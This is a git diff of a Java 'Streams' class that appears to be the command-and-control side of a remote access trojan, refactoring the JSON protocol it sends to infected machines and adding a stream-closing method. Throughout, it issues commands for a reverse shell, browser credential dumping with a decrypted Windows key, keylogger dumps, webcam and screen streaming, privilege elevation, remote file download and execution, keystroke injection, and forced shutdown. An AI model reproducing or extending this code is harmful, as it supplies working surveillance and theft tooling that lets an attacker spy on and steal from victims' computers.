@@ -137,19 +137,21 @@ public class Streams {
         JSONObject object = new JSONObject();
         switch (action) {
             case SYS_INFO -> {
-                object.put("SECTOR", "SYSTEM_INFORMATION");
+                
+                object.put("ACTION", "SYSTEM");
                 sendString(object.toString());
                 List<String> informationList = readList();
                 return listToSystemInformation(informationList);
             }
             case NET_INFO -> {
-                object.put("SECTOR", "NETWORK_INFORMATION");
+                
+                object.put("ACTION", "NETWORK");
                 sendString(object.toString());
                 String networkJSON = readString();
                 return listToNetworkInformation(networkJSON);
             }
             case DISK -> {
-                object.put("SECTOR", "FILE_MANAGER");
+                
                 object.put("ACTION", "SEND_DISKS");
                 mainStream.sendString(object.toString());
                 List<String> listOfDisks = readList();
@@ -157,7 +159,7 @@ public class Streams {
                 return listOfDisks.toArray(new String[0]);
             }
             case REQUEST_WEBCAM -> {
-                object.put("SECTOR", "DEV_ENUM");
+                
                 object.put("ACTION", "SEND_WEBCAM_DEVICES");
                 System.out.println("sended");
                 mainStream.sendString(object.toString());
@@ -183,7 +185,7 @@ public class Streams {
     public void sendAction(Action action, String destinationPath, int numOfFiles) throws IOException {
         JSONObject jsonObject = new JSONObject();
         if (action == Action.UPLOAD) {
-            jsonObject.put("SECTOR", "UP_DO_LOADER");
+            
             jsonObject.put("ACTION", "UPLOAD");
             jsonObject.put("path", destinationPath);
             jsonObject.put("num_of_files", numOfFiles);
@@ -194,7 +196,7 @@ public class Streams {
     public void sendAction(Action action, List<String> fileList, List<String> directoryList) throws IOException {
         JSONObject jsonObject = new JSONObject();
         if (action == Action.COPY) {
-            jsonObject.put("SECTOR", "FILE_MANAGER");
+            
             jsonObject.put("ACTION", "COPY");
             jsonObject.put("file_list", fileList);
             jsonObject.put("directory_list", directoryList);
@@ -205,7 +207,7 @@ public class Streams {
     public void sendAction(Action action, List<String> fileList, String directory) throws IOException {
         JSONObject jsonObject = new JSONObject();
         if (action == Action.MOVE) {
-            jsonObject.put("SECTOR", "FILE_MANAGER");
+            
             jsonObject.put("ACTION", "MOVE");
             jsonObject.put("file_list", fileList);
             jsonObject.put("path", directory);
@@ -216,7 +218,7 @@ public class Streams {
     public List<String> sendAndReadAction(Action action, String name) throws IOException {
         JSONObject object = new JSONObject();
         if (action == Action.R_A_DIR) {
-            object.put("SECTOR", "FILE_MANAGER");
+            
             object.put("ACTION", "SEND_DIRECTORY");
             object.put("path", name);
             mainStream.sendString(object.toString());
@@ -228,7 +230,7 @@ public class Streams {
     public String sendAndReadAction(Shell action, String command) throws IOException {
         JSONObject jsonObject = new JSONObject();
         if (action == Shell.COMMAND) {
-            jsonObject.put("SECTOR", "REVERSE_SHELL");
+            
             jsonObject.put("ACTION", "EXECUTE_COMMAND");
             jsonObject.put("command", command);
             mainStream.sendString(jsonObject.toString());
@@ -241,7 +243,7 @@ public class Streams {
         JSONObject jsonObject = new JSONObject();
         switch (action) {
             case DUMP_CREDENTIALS -> {
-                jsonObject.put("SECTOR", "CREDENTIALS");
+                
                 jsonObject.put("ACTION", "DUMP_BROWSER");
                 mainStream.sendString(jsonObject.toString());
                 byte[] decryptedWINKey = receiveBytesForCryptography();
@@ -257,13 +259,13 @@ public class Streams {
         JSONObject jsonObject = new JSONObject();
         switch (action) {
             case KEYBOARD_COMMAND -> {
-                jsonObject.put("SECTOR", "KEYBOARD");
+                
                 jsonObject.put("ACTION", "EXECUTE_SEQUENCE");
                 jsonObject.put("command", command);
                 mainStream.sendString(jsonObject.toString());
             }
             case BOX_MESSAGE -> {
-                jsonObject.put("SECTOR", "BOX_MESSAGE");
+                
                 jsonObject.put("ACTION", "SHOW_BOX");
                 jsonObject.put("command", command);
                 mainStream.sendString(jsonObject.toString());
@@ -275,7 +277,7 @@ public class Streams {
     public Object sendAndReadAction(Action action, String selectedDevice, boolean fragmented, int fps) throws IOException {
         JSONObject jsonObject = new JSONObject();
         if (action == Action.START_WEBCAM) {
-            jsonObject.put("SECTOR", "WEBCAM");
+            
             jsonObject.put("ACTION", "START_WEBCAM");
             jsonObject.put("selected_device", selectedDevice);
             jsonObject.put("is_fragmented", fragmented);
@@ -291,19 +293,19 @@ public class Streams {
         JSONObject jsonObject = new JSONObject();
         switch (action) {
             case DOWNLOAD -> {
-                jsonObject.put("SECTOR", "UP_DO_LOADER");
+                
                 jsonObject.put("ACTION", "DOWNLOAD");
                 jsonObject.put("file_list", fileList);
                 mainStream.sendString(jsonObject.toString());
             }
             case DELETE -> {
-                jsonObject.put("SECTOR", "FILE_MANAGER");
+                
                 jsonObject.put("ACTION", "DELETE");
                 jsonObject.put("file_list", fileList);
                 mainStream.sendString(jsonObject.toString());
             }
             case RUN -> {
-                jsonObject.put("SECTOR", "FILE_MANAGER");
+                
                 jsonObject.put("ACTION", "RUN");
                 jsonObject.put("file_list", fileList);
                 mainStream.sendString(jsonObject.toString());
@@ -313,7 +315,7 @@ public class Streams {
 
     public void sendAction(KeyloggerEvents event, String nameOfSession) throws IOException {
         JSONObject jsonObject = new JSONObject();
-        jsonObject.put("SECTOR", "KEYLOGGER");
+        
         switch (event) {
             case DUMP_LAST -> {
                 jsonObject.put("ACTION", "DUMP_LAST");
@@ -354,7 +356,7 @@ public class Streams {
         JSONObject object = new JSONObject();
         switch (permissions) {
             case ELEVATE_PRIVILEGES -> {
-                object.put("SECTOR", "PERMISSION");
+                
                 object.put("ACTION", "ELEVATE");
                 mainStream.sendString(object.toString());
                 return readSize();
@@ -367,7 +369,7 @@ public class Streams {
     public void sendAction(Screen action) throws IOException {
         JSONObject jsonObject = new JSONObject();
         if (action == Screen.STREAM) {
-            jsonObject.put("SECTOR", "SCREEN");
+            
             jsonObject.put("ACTION", "START_STREAMING");
             mainStream.sendString(jsonObject.toString());
         }
@@ -376,7 +378,6 @@ public class Streams {
 
     public void sendAction(ConnectionEnum action) throws IOException {
         JSONObject jsonObject = new JSONObject();
-        jsonObject.put("SECTOR", "CONN_STATE");
         switch (action) {
             case RESTART -> {
                 jsonObject.put("ACTION", -1);
@@ -395,18 +396,18 @@ public class Streams {
 
     public void stateAction(State state) throws IOException {
         JSONObject jsonObject = new JSONObject();
-        jsonObject.put("SECTOR", "SYSTEM_STATE");
+        jsonObject.put("ACTION","SYSTEM_STATE");
         switch (state) {
             case LOG_OFF -> {
-                jsonObject.put("ACTION", 0);
+                jsonObject.put("SUB_ACTION", 0);
                 mainStream.sendString(jsonObject.toString());
             }
             case SHUTDOWN -> {
-                jsonObject.put("ACTION", 1);
+                jsonObject.put("SUB_ACTION", 1);
                 mainStream.sendString(jsonObject.toString());
             }
             case REBOOT -> {
-                jsonObject.put("ACTION", 2);
+                jsonObject.put("SUB_ACTION", 2);
                 mainStream.sendString(jsonObject.toString());
             }
         }
@@ -446,6 +447,17 @@ public class Streams {
             read += dis.read(buffer, 0, size);
         }
         return new String(buffer);
+    }
+
+    public void closeStream(){
+        try {
+            dis.close();
+            dos.close();
+            clientSocket.close();
+        } catch (IOException e) {
+            throw new RuntimeException(e);
+        }
+        executor.shutdownNow();
     }
 
     public Socket getClientSocket() {
